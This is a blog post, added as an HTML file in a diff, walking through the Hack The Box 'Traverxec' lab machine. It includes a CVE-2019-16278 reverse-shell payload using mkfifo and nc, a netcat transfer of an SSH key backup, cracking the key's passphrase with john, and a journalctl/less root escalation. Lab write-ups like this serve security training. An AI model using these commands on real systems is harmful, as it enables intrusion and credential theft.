@@ -1,0 +1,113 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HTB] Traverxec | Foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('/img/bg.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB] Traverxec</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-12-17T17:31:44.000Z" id="date"> 2023-12-17</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-01-14T21:05:03.000Z" id="updated"> 2024-01-14</time></div></span></div></div><hr><div id="post-content"><div style="display: flex; justify-content: center; align-items: center;">
+
+  <div style="margin-right: 20px;" class='item-img' data-src='traverxec.png'><img src="traverxec.png" title="Traverxec" width="300px" height="300px" style="pointer-events: none;">
+  </div>
+
+  <div style="display: flex; flex-direction: column; text-align: left;">
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">OS: </strong class='item-img' data-src='linux.png'><img src="linux.png" alt="Linux" width="20px" height="20px" style="margin-left: 5px;">
+      <span style="margin-left: 5px;">Linux</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Difficulty:</strong>
+      <span>Easy</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Author:</strong>
+      <span>jkr</span>
+    </div>
+    <div style="display: flex; align-items: center;">
+      <strong style="margin-right: 5px;">Release Date:</strong>
+      <span>November 16, 2019</span>
+    </div>
+  </div>
+
+</div>
+
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sC -sV 10.10.10.165 -o nmap_scan<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 16:08 WET<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.165<br>Host is up (0.058s latency).<br>Not shown: 998 filtered tcp ports (no-response)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 aa:99:a8:16:68:<span class="hljs-built_in">cd</span>:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)<br>|   256 93:<span class="hljs-built_in">dd</span>:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)<br>|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)<br>80/tcp open  http    nostromo 1.9.6<br>|_http-server-header: nostromo 1.9.6<br>|_http-title: TRAVERXEC<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.04 seconds<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">Port</th>
+<th align="center">Service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">22</td>
+<td align="center">SSH</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td align="center">HTTP Nostromo 1.9.6</td>
+</tr>
+</tbody></table>
+<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><h3 id="CVE-2019-16278"><a href="#CVE-2019-16278" class="headerlink" title="CVE-2019-16278"></a>CVE-2019-16278</h3><p>After googling for nostromo 1.9.6 exploit, we can find <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47837">CVE-2019-16278</a><br class='item-img' data-src='/HTB/Traverxec/whoami.png'><img src="/HTB/Traverxec/whoami.png"></p>
+<p>We just need to setup a listener and run a revshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc -lvnp 1234<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python CVE-2019-16278.py 10.10.10.165 80 <span class="hljs-string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.9 1234 &gt;/tmp/f&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/HTB/Traverxec/revshell.png'><img src="/HTB/Traverxec/revshell.png"></p>
+<h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><p>&#x2F;etc&#x2F;passwd<br class='item-img' data-src='/HTB/Traverxec/passwd.png'><img src="/HTB/Traverxec/passwd.png"></p>
+<p>With this we know there is a user called David</p>
+<h3 id="SSH-backup"><a href="#SSH-backup" class="headerlink" title="SSH backup"></a>SSH backup</h3><p>Right now we cannot access David’s home folder, however by looking at the nostromo’s config files, there is a public_www folder in the user’s home folder that we have access to</p>
+<p>&#x2F;var&#x2F;nostromo&#x2F;conf&#x2F;nhttpd.conf<br class='item-img' data-src='/HTB/Traverxec/nhttpd.png'><img src="/HTB/Traverxec/nhttpd.png"></p>
+<p>And we can see that there is a backup for ssh id files<br class='item-img' data-src='/HTB/Traverxec/sshbackup.png'><img src="/HTB/Traverxec/sshbackup.png"></p>
+<p>We can use netcat to transfer the file to our machine</p>
+<p>On local machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc -lvp 1337 &gt; backup-ssh.tgz<br></code></pre></td></tr></table></figure>
+
+<p>On remote server:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc 10.10.14.9 1337 &lt; backup-ssh-identity-files.tgz<br></code></pre></td></tr></table></figure>
+
+<p>We now just need to extract it’s contents and we confirm that we have David’s ssh private key (id_rsa)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ tar -xvf backup-ssh.tgz<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Traverxec/extractedkey.png'><img src="/HTB/Traverxec/extractedkey.png"></p>
+<p>If we try logging in now, we will see that this key has a password</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">chmod</span> 400 id_rsa<br>$ ssh -i id_rsa david@10.10.10.165<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Traverxec/idrsapassword.png'><img src="/HTB/Traverxec/idrsapassword.png"></p>
+<p>To decrypt the password, we can use ssh2john and then john to decrypt the password</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ss2john id_rsa &gt; hash.txt<br>$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Traverxec/idrsapassworddecrypted.png'><img src="/HTB/Traverxec/idrsapassworddecrypted.png"></p>
+<p>Now we know the id_rsa password, we can just ssh into the machine as David and get the user flag<br class='item-img' data-src='/HTB/Traverxec/sshdavid.png'><img src="/HTB/Traverxec/sshdavid.png"><br class='item-img' data-src='/HTB/Traverxec/userflag.png'><img src="/HTB/Traverxec/userflag.png"></p>
+<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><h3 id="sudo-journalctl"><a href="#sudo-journalctl" class="headerlink" title="sudo journalctl"></a>sudo journalctl</h3><p>David has a bin directory in it’s home folder, and a bash script called “server-stats.sh” inside.</p>
+<p>If we look into it’s contents we can see that it runs journalctl as root, and since David can run this file, we can use this to run a command as root<br class='item-img' data-src='/HTB/Traverxec/journalctl1.png'><img src="/HTB/Traverxec/journalctl1.png"></p>
+<p>If we run this command, it will just print the output and nothing else happens, however, the -n5 flag means it will print only print 5 lines in the output.<br>We can shrink our terminal to where we can only see less than 5 lines, and when we run the command, we will see that the binary “less” runs.<br>And since this happens in the command that was ran as root (journalctl) we can run any command as root.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service<br>!/bin/bash<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Traverxec/lessroot.png'><img src="/HTB/Traverxec/lessroot.png"></p>
+<p>Now we just get the root flag<br class='item-img' data-src='/HTB/Traverxec/rootflag.png'><img src="/HTB/Traverxec/rootflag.png"></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/HTB/Valentine/">← Next [HTB] Valentine</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/HTB/Surveillance/">[HTB] Surveillance Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'Foguh' Ferreira</a></h1><div id="description"><p>Junior PenTester</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">2.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-16278"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2019-16278</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement"><span class="toc-number">3.</span> <span class="toc-text">Lateral Movement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-backup"><span class="toc-number">3.1.</span> <span class="toc-text">SSH backup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">4.</span> <span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-journalctl"><span class="toc-number">4.1.</span> <span class="toc-text">sudo journalctl</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
